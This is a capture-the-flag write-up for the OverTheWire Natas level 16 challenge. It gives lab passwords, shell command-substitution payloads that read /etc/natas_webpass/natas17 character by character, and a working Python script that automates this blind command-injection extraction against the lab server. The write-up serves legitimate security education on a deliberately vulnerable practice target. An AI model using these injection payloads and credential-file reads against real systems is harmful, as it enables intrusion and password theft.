# Level 15 → Level 16

## Details
Username: `natas16`<br />
Password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`<br />
URL:      http://natas16.natas.labs.overthewire.org

## Solution

# exstract spesific letter from password
`$(cut -c 1-1 /etc/natas_webpass/natas17)`


# convert numbers to chars
`$(printf \\$(printf %03o $((97+$(cut -c 8-8 /etc/natas_webpass/natas17)))))`

# convert char to 'a' just if it was lower case

`$(python3 -c $(echo print\(chr\(97+\(100-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c 3-3
 b.sh)$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))`

 `$(python3 -c $(echo print\(chr\(97+\(105-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c 5-5
 /etc/natas_webpass/natas16)$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))`

https://stackoverflow.com/questions/12855610/shell-script-is-there-any-way-converting-number-to-char


and then extract just one letter!
and do it like "blind sql injection"


```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CHAR_EXTRACTION = "$(cut -c {}-{} {})"
DIGIT_EXTRACTION = "$(printf \\\$(printf %03o $((97+$(cut -c {}-{} {})))))"
DETECT_LOWER_CASE = "$(python3 -c $(echo print\(chr\(97+\({}-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c {}-{} {})$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))"


URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] =\
"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    # This is not what prevents distinction between upper and lowercase letters.
    # but done for convenience.
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')
    
def get_common_letter(words_list):
    # remove the last 'word' that equals always to ''
    words_list = words_list[:-1]
    
    # it's no words so digit here.
    if not words_list: return '_'
    
    # take the shortest word in the list
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # if there is word with one character, so this is the common letter.
    if(len(shortes_word) == 1): return shortes_word
    
    # find the letter that apear in every word.
    for letter in shortes_word:
        is_common = True
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break
        
        if is_common: return letter

password = ""

print("FIND CASE-INSENSITIVE LETTERS:") 
for i in range(1, PASSWORD_LENGTH+1):
    response = post(url=URL, headers=HEADERS, data=DATA+quote(CHAR_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
    password += get_common_letter(get_dictionary_words(response.text))
    print("password: " + password.ljust(32, "_"))
    
if '_' in password:
    print("\nFIND DIGITS:") 
    while('_' in password):
        i = password.find('_') + 1
        response = post(url=URL, headers=HEADERS, data=DATA+quote(DIGIT_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(response.text))
        digit = str(ord(letter) - ord('a'))
        password = password.replace('_', digit, 1)
        print("password: " + password.ljust(32, "_"))
        
print("\nDETECT UPPER CASE LETTER:")
for i in range(PASSWORD_LENGTH):
    if password[i].isalnum():
        response = post(url=URL, headers=HEADERS, data=DATA+quote(DETECT_LOWER_CASE.format(ord(password[i]),i+1,i+1,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(response.text))
        if letter != 'a':
            password = password[:i] + password[i].upper() + password[i+1:]
            print("password: " + password.ljust(32, "_"))
```

## Password for the next level:
```
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```